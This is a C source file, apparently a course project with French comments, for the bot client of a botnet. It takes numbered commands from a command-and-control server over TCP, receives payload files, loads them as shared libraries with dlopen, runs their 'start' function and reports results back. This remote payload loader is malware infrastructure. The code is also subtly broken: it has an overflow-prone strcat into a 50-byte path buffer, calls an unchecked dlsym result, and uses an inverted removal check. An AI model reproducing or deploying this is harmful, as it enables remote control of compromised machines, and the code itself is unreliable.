#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <dlfcn.h>

#include <libthrd.h>
#include <libnetwork.h>
#include <liblistes.h>
#include "bot.h"

extern liste_cu_t list_CU;
extern info_bot_t *bot;
/**
 * void send_status(int socket_tcp)
 * Fonction qui envoie le statut du bot au CC sur la socket TCP
 * param la socket de communication 
 
*/
void send_status(int socket_tcp)
{
    printf("[send_status]Start\n");
    printf(" Le status que j'ai récup est : %c\n", bot->etat);
    if (write(socket_tcp, &bot->etat, sizeof(char)) < 0)
    {
        perror("[send_status]ERROR\n");
        exit(1);
    }
}
/**
 * void start_charge(char *file_name)
 * Fonction permettant d'exécuter une charge utile 
 * param structure de la charge utile 
 */
void start_charge(char *filename)
{
    printf("[start_charge]Start\n");
    bot->etat = BOT_ACTIF; // => le bot est occupé
    // chercher dans la liste le nom de la charge
    charge_utile_t *charge;
    if (rechercheCU(filename, &list_CU, &charge) != 0)
    {
        perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
        return;
    }
    // TO DO : vérifier que la charge n'a pas déjà été start (qu'elle tourne pas déjà )
    printf("Je vais start le fichier : %s \n", charge->nom);
    init_f start;
    //https://stackoverflow.com/questions/14134245/iso-c-void-and-function-pointers
    *(void **)(&start) = dlsym(charge->plugin, "start");
    char *result = dlerror();
    if (result)
    {
        perror("Cannot find start");
    }
    //dlclose(charge.nom);
    //Lancement de la fonction start dans un thread

    printf("Lancement du thread sur la fonction chargée\n");
    int retour = start(NULL);
    printf("Le retour de la charge est %d (J'attendais 125)\n", retour);
    //remplir les attributs executed et resultat
    charge->resultat = retour;
    charge->executed = CHARGE_EXECUTED;
    bot->etat = BOT_INACTIF; // => le bot est à nouveau disponible
    print_CU_structure(charge);
}

/**
 * void install_charge(char *file_name)
 * Fonction permettant d'installer une charge sur le BOT
 * param le nom de la charge utile
 */

void install_charge(char *file_name)
{
    printf("[install_charge]Start\n");
    //chercher dans la liste la structure portant ce nom
    charge_utile_t *charge;
    if (rechercheCU(file_name, &list_CU, &charge) != 0)
    {
        perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
        return;
    }

    if (charge == NULL)
    {
        printf("Did not find the charge installed\n");
        //Ajouter à la liste la charge_utile (installe le plugin)
        charge = (charge_utile_t *)malloc(sizeof(charge_utile_t));
        charge->nom = strdup(file_name);
        ajout_tete_cu(&list_CU, charge);
        printf("Successfully added the charge\n");
        //Chargement du fichier en tant que librairie dynamique
        //file_name = PATH du fichier (relatif ou absolu)
        char new_path[50];
        getcwd(new_path, sizeof(new_path));
        strcat(new_path, "/");
        strcat(new_path, file_name);
        charge->plugin = dlopen(new_path, RTLD_NOW);
        if (!charge->plugin)
        {
            printf("!!! %s\n", dlerror());
            return;
        }
        print_listeCU(list_CU);
    }
    else
    {
        //On ne fait rien, la charge est déja installée
        printf("Charge already installed ! \n");
    }
}
/** void rm_charge(char *filename)
 *  Fonction permettant de supprimer une charge à partir de son filename
 *  param filname
 *  
*/

void rm_charge(char *filename)
{
    printf("[rm_charge]Start\n");
    charge_utile_t *structure;
    //cherche dans la liste des charges celle qu'on lui a donnée
    if (rechercheCU(filename, &list_CU, &structure) != 0)
    {
        perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
        return;
    }
    if (structure == NULL)
    {
        printf("je vais supprimer le fichier : %s\n", filename);
        // rm de la liste
        supp_elm_liste_CU(&list_CU, filename);
    }
    else
    {
        //On ne fait rien, la charge a déjà été supprimée
        printf("Charge already deleted ! \n");
    }
    printf("La charge utile %s a bien été supprimée ! \n", filename);
    // TO DO :Répondre au cc

}
/** int getChargeFromMessage(int socket, charge_utile_t **returned_charge)
 * Fonction permettant de récupérer une charge utile à partir d'un nom de charge
 * param la socket 
 * la strcture de la charge à remplir 
 * return 0 in success 1 si erreur
 */
int getChargeFromMessage(int socket, charge_utile_t **returned_charge)
{
    printf("[getChargeFromMessage]Start\n");
    char filename[TAILLE_FILENAME];
    if (receiveTCP(socket, filename, TAILLE_FILENAME) < 0)
    {
        printf("Erreur dans la réception du nom de la charge utile\n");
        return 1;
    }
    printf("Le nom du fichier est : %s\n", filename);
    charge_utile_t *charge;
    if (rechercheCU(filename, &list_CU, &charge) != 0)
    {
        perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
        *returned_charge = NULL;
        return 1;
    }
    if (charge != NULL)
    {
        print_CU_structure(charge);
        *returned_charge = charge;
        return 0;
    }
    else
    {
        printf("La charge utile n'existe pas");
        *returned_charge = NULL;
        return 0;
    }
}
/** void send_result(int socket_tcp, int *resultat)
 * Fonction permettant d'envoyer le resultat de l'exec d'une charge au CC
 * param la socket surlquelle envoyer
 * param le resultat à envoyer
 */
void send_result(int socket_tcp, int *resultat)
{
    printf("[send_result]Start\n");
    printf(" Le résultat que je vais envoyer est : %d\n", *resultat);
    char str[TAILLE_MSG_PROTOCOLE];
    sprintf(str, "%d", *resultat); // on transforme le resultat en chaine de caractère pour l'envoyer
    if (write(socket_tcp, str, sizeof(str)) < 0)
    {
        perror("[send_status]ERROR\n");
        exit(1);
    }
}
/** void quit_connexion()
 * Fonction wrapper permettant de detruire la liste des charges présentes sur le BOT
 */ 
void quit_connexion()
{
    detruire_liste_CU(&list_CU);
}
/** void receive_cmd_TCP(void *arg)
 *  Fonction qui reçoit une numéro de commande et en fct de la commande il interprète 
 */
void receive_cmd_TCP(void *arg)
{
    printf("[receive_cmd_TCP]Start\n");
    char cmd_recue;
    int socket_tcp = *((int *)arg);
    charge_utile_t *charge;
    char filename[TAILLE_FILENAME];

    if (receiveTCP(socket_tcp, &cmd_recue, sizeof(cmd_recue)) != sizeof(cmd_recue))
    {
        printf("Erreur dans la récéption de la commande TCP\n");
    };
    printf("[receive_cmd_TCP]La cmd que j'ai lu de mon client TCP est : %c\n", cmd_recue);
    switch (cmd_recue)
    {
    case '1': // STATUT
        send_status(socket_tcp);
        break;

    case '2': //INSTALL
        if (receiveTCP(socket_tcp, filename, TAILLE_FILENAME) < 0)
        {
            printf("Erreur dans la réception du nom de la charge utile\n");
            exit(1);
        }
        printf("Le nom de fichier que je vais installer est : %s\n", filename);
        recvFile(&socket_tcp, filename);
        break;
    case '3': //START
        if (getChargeFromMessage(socket_tcp, &charge) != 0)
        {
            perror("Une erreur est survenue lors du getChargeMessage\n");
            //renvoieErreur()
        }
        if (charge == NULL)
        {
            perror("Can't start charge utile\n");
            //TODO : Renvoyer dans la socket le fait que la charge utile est introuvable
            //renvoieErreur();
        }
        else
        {
            print_CU_structure(charge);
            start_charge(charge->nom);
        }
        break;
    case '4': // Résultat d'exécution d'une charge particuliere
        if (getChargeFromMessage(socket_tcp, &charge) != 0)
        {
            perror("Une erreur est survenue lors du getChargeMessage\n");
            //renvoieErreur()
        }
        if (charge == NULL)
        {
            perror("Can't rm charge utile\n");
            //TODO : Renvoyer dans la socket le fait que la charge utile est introuvable
            //renvoieErreur();
        }
        else
        {
            send_result(socket_tcp, &charge->resultat);
        }

        break;

    case '5': //RM une charge particulière
        if (getChargeFromMessage(socket_tcp, &charge) != 0)
        {
            perror("Une erreur est survenue lors du getChargeMessage\n");
            //renvoieErreur()
        }
        if (charge == NULL)
        {
            perror("Can't rm charge utile\n");
            //TODO : Renvoyer dans la socket le fait que la charge utile est introuvable
            //renvoieErreur();
        }
        else
        {
            print_CU_structure(charge);
            rm_charge(charge->nom);
        }
        break;
    case '6': //QUIT connexion => détruire la liste des charges
        quit_connexion();
        break;
    }
}

/* void renvoieErreur(){

} */